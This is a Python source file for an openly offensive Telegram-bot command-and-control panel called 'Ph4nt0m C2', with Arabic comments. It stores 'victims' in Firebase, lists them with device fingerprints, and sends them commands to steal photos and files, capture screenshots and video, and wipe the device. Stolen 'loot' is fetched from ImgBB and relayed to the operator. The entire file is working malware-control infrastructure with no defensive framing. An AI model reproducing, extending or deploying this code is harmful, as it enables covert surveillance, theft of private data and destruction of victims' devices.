#!/usr/bin/env python3
"""
Ph4nt0m Telegram C2 - ImgBB Edition
يستخدم ImgBB لرفع الصور والملفات.
"""
import os, json, base64, threading, requests
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from firebase_admin import credentials, initialize_app, db

# ---------- Flask (للمنفذ الوهمي) ----------
flask_app = Flask(__name__)
@flask_app.route('/')
def home():
    return "System Active"

def run_flask():
    port = int(os.environ.get("PORT", 8000))
    flask_app.run(host='0.0.0.0', port=port)

# ---------- إعدادات Firebase و ImgBB ----------
BOT_TOKEN = os.environ["BOT_TOKEN"]
FIREBASE_URL = os.environ["FIREBASE_URL"]
IMGBB_API_KEY = os.environ["IMGBB_API_KEY"]

firebase_creds = os.environ.get("FIREBASE_CREDS")
if firebase_creds:
    cred = credentials.Certificate(json.loads(firebase_creds))
    initialize_app(cred, {'databaseURL': FIREBASE_URL})
else:
    initialize_app(options={'databaseURL': FIREBASE_URL})

victims_ref = db.reference('victims')
current_victim = {}

def get_online_victims():
    snap = victims_ref.get()
    if not snap: return {}
    return {k:v for k,v in snap.items() if v.get('online')}

async def send_file_from_url(update, url, filename, caption):
    """تحميل الملف من ImgBB وإرساله إلى تيليجرام"""
    try:
        response = requests.get(url)
        if response.status_code == 200:
            await update.message.reply_document(document=response.content, filename=filename, caption=caption)
        else:
            await update.message.reply_text(f"فشل تحميل الملف: {url}")
    except Exception as e:
        await update.message.reply_text(f"خطأ: {e}")

# ---------- لوحات الأزرار ----------
def get_victims_keyboard():
    keyboard = []
    vics = get_online_victims()
    for vid, info in vics.items():
        fg = info.get('fingerprint', {})
        label = f"🖥 {vid} ({fg.get('plat','?')})"
        keyboard.append([InlineKeyboardButton(label, callback_data=f'select_{vid}')])
    keyboard.append([InlineKeyboardButton("🔄 تحديث القائمة", callback_data='refresh_victims')])
    return InlineKeyboardMarkup(keyboard)

def get_control_keyboard():
    keyboard = [
        [InlineKeyboardButton("📷 سحب الصور", callback_data='get_photos'),
         InlineKeyboardButton("📁 سحب الملفات", callback_data='get_files')],
        [InlineKeyboardButton("🖼️ لقطة شاشة", callback_data='screenshot'),
         InlineKeyboardButton("🎥 فيديو 10 ثوان", callback_data='record_video')],
        [InlineKeyboardButton("📳 اهتزاز", callback_data='vibrate'),
         InlineKeyboardButton("🔊 تشغيل صوت", callback_data='play_sound')],
        [InlineKeyboardButton("📂 عرض المسروقات", callback_data='loot')],
        [InlineKeyboardButton("💣 فرمتة الجهاز", callback_data='format'),
         InlineKeyboardButton("🚫 مسح الجلسة", callback_data='leave')],
        [InlineKeyboardButton("🔙 رجوع للضحايا", callback_data='back_to_victims')]
    ]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚡ **Ph4nt0m C2 Bot**\n\nاختر زر 'عرض الضحايا' للتحكم.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📟 عرض الضحايا المتصلين", callback_data='show_victims')]
        ])
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data

    if data == 'show_victims' or data == 'back_to_victims' or data == 'refresh_victims':
        vics = get_online_victims()
        if not vics:
            await query.edit_message_text("لا توجد أجهزة متصلة حالياً.", reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 تحديث", callback_data='refresh_victims')]
            ]))
            return
        txt = "📟 **الضحايا المتصلين:**\nاختر جهازاً للتحكم."
        await query.edit_message_text(txt, reply_markup=get_victims_keyboard())
        if current_victim.get(uid): del current_victim[uid]
        return

    if data.startswith('select_'):
        vid = data.replace('select_', '')
        vics = get_online_victims()
        if vid not in vics:
            await query.edit_message_text("هذا الجهاز لم يعد متصلاً. اختر جهازاً آخر:", reply_markup=get_victims_keyboard())
            return
        current_victim[uid] = vid
        fg = vics[vid].get('fingerprint', {})
        txt = f"✅ **تم التحكم بـ:** `{vid}`\n📱 النظام: {fg.get('plat','?')}\n🌐 المتصفح: {fg.get('ua','')[:40]}..."
        await query.edit_message_text(txt, reply_markup=get_control_keyboard())
        return

    vid = current_victim.get(uid)
    if not vid:
        await query.edit_message_text("انتهت الجلسة. اختر ضحية من جديد:", reply_markup=get_victims_keyboard())
        return

    if data == 'leave':
        victims_ref.child(vid).remove()
        if current_victim.get(uid) == vid: del current_victim[uid]
        await query.edit_message_text("🚫 تم مسح الجلسة وفصل الجهاز.", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📟 عرض الضحايا", callback_data='show_victims')]
        ]))
        return

    if data == 'loot':
        loot = db.reference(f'victims/{vid}/loot').get()
        if not loot:
            await query.edit_message_text("لا توجد مسروقات بعد.", reply_markup=get_control_keyboard())
            return
        items = list(loot.items())[-5:]
        await query.edit_message_text("📂 **آخر 5 مسروقات:**", reply_markup=get_control_keyboard())
        for key, item in items:
            typ = item.get('type')
            name = item.get('name', typ)
            url = item.get('url')
            if url and typ in ('screenshot','video','file'):
                # نرسل الملف من ImgBB إلى تيليجرام
                await send_file_from_url(query, url, f"{name}.{'png' if typ=='screenshot' else 'webm' if typ=='video' else ''}", f"📎 {name}")
            else:
                await query.message.reply_text(f"[{typ}] {name} - لا يوجد رابط.")
        return

    # الأوامر التنفيذية
    params = {}
    if data == 'vibrate': params['duration'] = 5000
    elif data == 'record_video': params['duration'] = 10

    cmd = {"action": data, **params}
    db.reference(f'victims/{vid}/command').set(cmd)
    await query.edit_message_text(f"✅ تم إرسال الأمر: {data}\nالجهاز: `{vid}`", reply_markup=get_control_keyboard())

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    print("🤖 Ph4nt0m Bot Started...")
    app.run_polling()

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    main()
